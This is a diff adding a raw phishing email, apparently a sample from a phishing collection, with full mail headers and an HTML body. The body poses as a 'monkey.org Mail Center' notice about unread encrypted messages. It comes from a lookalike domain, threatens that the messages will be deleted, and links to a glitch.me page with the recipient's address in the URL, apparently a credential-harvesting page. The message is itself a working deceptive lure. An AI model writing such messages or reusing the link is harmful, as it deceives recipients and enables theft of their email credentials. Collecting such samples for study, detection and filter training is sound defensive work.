@@ -1,0 +1,85 @@
+Return-Path: jose@synergynatural.cam
+Delivered-To: jose@monkey.org
+X-FDA: 80189619006.18.099B5AD
+Received: from mail.synergynatural.cam (mail.synergynatural.cam [94.103.183.88])
+	by imf26.b.hostedemail.com (Postfix) with ESMTP id 0AF1110CCDE15
+	for <jose@monkey.org>; Wed, 30 Nov 2022 09:42:41 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed;
+	d=synergynatural.cam; s=default; h=From:To:Subject:MIME-Version:
+	Content-Type:Content-Transfer-Encoding; bh=+usLXXGUEZEamx7+gjQJK
+	W8klRw=; b=fmzB1q1e8MNzETi120FBAHaSPJ1Xho31RXR0Gifkg/p+eIOuIoFM/
+	UBT4Ngma7xZkRhi2oOvWfblz4uGUGpfTdcz5acO1kW5MN7ZXXoUsj4KxDU7CFNZ8
+	kMwBPX3+SvM9aMwr3A9KHNZaKdQUZQo8v6jPrvrcRrHUZ3HeBc3eoo=
+From: "monkey.org Mail Center" <jose@synergynatural.cam>
+To: jose@monkey.org
+Subject: 7 unread encrypted emails received
+Date: 30 Nov 2022 01:42:40 -0800
+Message-ID: <20221130014239.B0318B8EC2A08AA0@synergynatural.cam>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+ARC-Authentication-Results: i=1;
+	imf26.b.hostedemail.com;
+	dkim=pass header.d=synergynatural.cam header.s=default header.b=fmzB1q1e;
+	dmarc=pass (policy=none) header.from=synergynatural.cam;
+	spf=pass (imf26.b.hostedemail.com: domain of jose@synergynatural.cam designates 94.103.183.88 as permitted sender) smtp.mailfrom=jose@synergynatural.cam
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1669801362;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=TZfK3M4B6mp+6jegNcjAz3FiIHHhxvagwGWYAo2nTv0=;
+	b=pTN90TQgvv5a23ar+vBepnQQTexFid0Gwv6pys/SkCzLToIbObRerg8CperJBQ9hMRYcPk
+	GKIWok0nmJ8s83FNCBM97R5dC+0vZc1RsGn7ldCzOCEFfE3BiIM3dUatJyUbCvU0yPk4Q/
+	7Ettu5lkDakgAS3YF8z2C9jWXv8WYx8=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1669801362; a=rsa-sha256;
+	cv=none;
+	b=8WCKyBguGAbDUrjk20ab9TN9rd8U3FYpUeyKQHt2yGYHW949DXDFt+RvM5jOJlQois+oyu
+	pVFneR0PV0XXD5QBZq4x+V1ZDsCW0rQT5r0ZbhjgqVpwAaBMSW0jCmb2fhe1TtCRd1cJ7h
+	nu9laRRiop7+8/S04VgS8QMIW2F8Mb8=
+Authentication-Results: imf26.b.hostedemail.com;
+	dkim=pass header.d=synergynatural.cam header.s=default header.b=fmzB1q1e;
+	dmarc=pass (policy=none) header.from=synergynatural.cam;
+	spf=pass (imf26.b.hostedemail.com: domain of jose@synergynatural.cam designates 94.103.183.88 as permitted sender) smtp.mailfrom=jose@synergynatural.cam
+X-Rspam-User: 
+X-Spam-Status: No, score=3.60
+X-Stat-Signature: xna9imyg6c1rqbwjax1f9w8gbcc8d4oi
+X-Rspamd-Queue-Id: 0AF1110CCDE15
+X-Rspamd-Server: rspam09
+X-HE-Tag: 1669801361-781644
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 225
+
+<!DOCTYPE html><html>
+
+<html><head>
+    <title>domain555.html</title>
+    <meta http-equiv=3D"content-type" content=3D"text/html; charset=3D">
+    <meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.18349">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+  <body><p>
+	<strong>You have&nbsp;7 secure messages in the server</strong><strong><br>=
+</strong></p><p><strong>
+	<br></strong></p><p><font color=3D"#d83c27"><strong>Date: 11/30/2022 1:42:=
+39 a.m. </strong></font></p><p><font color=3D"#d83c27"><strong>Account:jose=
+@monkey.org</strong><strong><font color=3D"#000000"> </font></strong></font=
+><br><strong>
+&nbsp;=09
+</strong>	</p><p>
+<strong>You received&nbsp;14 important encrypted messages to your email jos=
+e@monkey.org.</strong></p><p><strong>
+=09
+
+<a href=3D"https://beaded-grandioseaprilolkiuj.glitch.me#jose@monkey.org" t=
+arget=3D"_self" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp=
+://portal.cherryservers.com/%23/settings/profile&amp;source=3Dgmail&amp;ust=
+=3D1668651745504000&amp;usg=3DAOvVaw2marFCaY9b3KVz6nuQlfrC">Follow this lin=
+k to read your encrypted message.</a>&nbsp;</strong></p><p>Secured messages=
+ cannot be viewed directly in your mailbox.</p><p>Messages left unread will=
+ be deleted permanently</p><p><br></p><p><strong>
+Mail Server at monkey.org</strong></p><p><br></p></body></html>
+
